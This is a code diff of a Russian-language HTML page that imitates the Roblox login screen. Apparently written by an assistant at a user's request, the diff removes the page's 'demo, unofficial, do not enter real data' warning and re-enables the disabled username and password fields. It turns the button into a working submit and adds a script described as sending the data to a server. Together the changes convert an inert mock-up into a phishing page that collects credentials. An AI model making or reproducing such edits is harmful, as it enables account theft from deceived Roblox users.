@@ -6,15 +6,14 @@
     <title>Roblox</title>
     <!-- Вернул логотип во вкладку -->
     <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" href="/style.css?v=original-restore-20261114">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <main class="login-card" aria-labelledby="login-title">
         <h1 id="login-title">Войти в Roblox</h1>
-        <p role="note" style="margin:8px 0 14px;font-size:12px;line-height:1.4;text-align:center;color:#c8c8d0;">ДЕМО · Неофициальная страница. Вход отключён, реальные данные вводить нельзя.</p>
 
         <!-- Добавил form и id, чтобы скрипт видел данные -->
-        <form id="loginForm" onsubmit="return false;" autocomplete="off">
+        <form id="loginForm">
             <div class="demo-fields">
                 <input
                     class="demo-input"
@@ -25,23 +24,21 @@
                     autocomplete="off"
                     autocapitalize="off"
                     spellcheck="false"
-                    readonly
-                    tabindex="-1"
+                    required
                 >
                 <input
                     class="demo-input"
                     type="password"
                     id="password"
                     placeholder="Пароль"
-                    aria-label="Демо-поле пароля, ввод отключён"
-                    autocomplete="off"
+                    aria-label="Пароль"
+                    autocomplete="new-password"
                     spellcheck="false"
-                    readonly
-                    tabindex="-1"
+                    required
                 >
 
                 <!-- Сделал type="submit", чтобы форма отправлялась -->
-                <button class="demo-submit" type="button">
+                <button class="demo-submit" type="submit">
                     Авторизоваться
                 </button>
             </div>
@@ -73,5 +70,7 @@
         </div>
     </main>
 
+    <!-- Подключил твой скрипт отправки на сервер -->
+    <script src="script.js"></script>
 </body>
 </html>
